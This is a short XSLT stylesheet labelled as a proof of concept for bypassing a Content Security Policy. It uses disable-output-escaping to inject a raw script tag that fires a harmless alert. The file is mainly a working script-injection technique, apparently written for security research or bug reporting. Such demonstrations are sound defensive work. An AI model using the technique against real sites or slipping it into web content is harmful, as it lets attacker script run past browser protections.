<?xml version="1.0"?>
<xsl:stylesheet version="1.0"
    xmlns:xsl="http://www.w3.org/1999/XSL/Transform">
  <xsl:output method="html"/>
  <xsl:template match="/">
    <xsl:text disable-output-escaping="yes"><![CDATA[
      <script>alert("XSLT CSP Bypass PoC!")</script>
    ]]></xsl:text>
  </xsl:template>
</xsl:stylesheet>
